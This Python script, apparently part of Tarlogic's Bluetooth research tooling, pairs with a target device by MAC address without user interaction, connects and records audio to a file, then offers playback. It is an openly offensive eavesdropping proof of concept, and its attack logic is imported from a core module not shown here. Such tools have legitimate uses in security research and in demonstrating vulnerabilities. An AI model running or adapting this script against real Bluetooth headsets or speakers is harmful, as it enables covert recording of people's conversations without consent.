#!/usr/bin/env python3

import argparse
from core import connect, BluezTarget, BluezAddressType, pair, record, playback
import time


class bcolors:
    HEADER = "\033[34m"
    OK_BLUE = "\033[94m"
    OK_CYAN = "\033[96m"
    OK_GREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


def main():
    parser = argparse.ArgumentParser(
        prog="No interaction recording",
        description="Try to pair to a device, connect to it and record sound without user interaction",
    )
    parser.add_argument(
        "-a",
        "--target-address",
        help="Target device MAC address",
        required=True,
        dest="address",
    )
    parser.add_argument(
        "-t",
        "--target-address-type",
        help="Target device MAC address type",
        dest="address_type",
        type=lambda t: BluezAddressType[t],
        choices=list(BluezAddressType),
        default=BluezAddressType.BR_EDR,
    )
    parser.add_argument(
        "-f",
        "--file",
        help="File to store recorded audio",
        dest="outfile",
        default="recording.wav",
    )
    parser.add_argument(
        "-s",
        "--sink",
        help="Sink to play the audio back",
        dest="sink",
        default="alsa_output.pci-0000_00_05.0.analog-stereo",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        help="Show verbose output",
        dest="verbose",
        default=False,
        action='store_true'
    )

    args = parser.parse_args()

    print(f"{bcolors.HEADER}░█▀▄░█░░░█░█░█▀▀░█▀▀░█▀█░█░█░{bcolors.ENDC}")
    print(f"{bcolors.HEADER}░█▀▄░█░░░█░█░█▀▀░▀▀█░█▀▀░░█░░{bcolors.ENDC}")
    print(f"{bcolors.HEADER}░▀▀░░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀░░░░▀░░{bcolors.ENDC}")
    print(f"{bcolors.HEADER}░▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀░{bcolors.ENDC}")

    print(f"Bluetooth audio recording tool by {bcolors.HEADER}Tarlogic{bcolors.ENDC}")
    print()
    print(
        f"[{bcolors.OK_GREEN}I{bcolors.ENDC}] Avoiding authentication with {args.address}..."
    )
    print(f"[{bcolors.OK_GREEN}I{bcolors.ENDC}] Generating shared key...")
    pair(BluezTarget(args.address, args.address_type), verbose=args.verbose)
    print(f"[{bcolors.WARNING}!{bcolors.ENDC}] Key generated")
    print(f"[{bcolors.OK_GREEN}I{bcolors.ENDC}] Establishing connection...")
    time.sleep(1)
    connect(BluezTarget(args.address, args.address_type), verbose=args.verbose)
    print(f"[{bcolors.OK_GREEN}I{bcolors.ENDC}] Starting audio recording...")
    print(f"[{bcolors.WARNING}!{bcolors.ENDC}] Recording!")
    time.sleep(1)
    record(BluezTarget(args.address), outfile=args.outfile, verbose=args.verbose)
    print(f'[{bcolors.WARNING}!{bcolors.ENDC}] Recording stored in "{args.outfile}"')

    print(f"[{bcolors.OK_BLUE}?{bcolors.ENDC}] Play audio back? ")
    option = input("[Y/n] ") or "y"
    if option.lower() in ("y", "yes"):
        print(f"[{bcolors.WARNING}!{bcolors.ENDC}] Playing audio back!")
        playback(args.sink, args.outfile, verbose=args.verbose)
    print(f"[{bcolors.OK_GREEN}I{bcolors.ENDC}] Exiting")


if __name__ == "__main__":
    main()
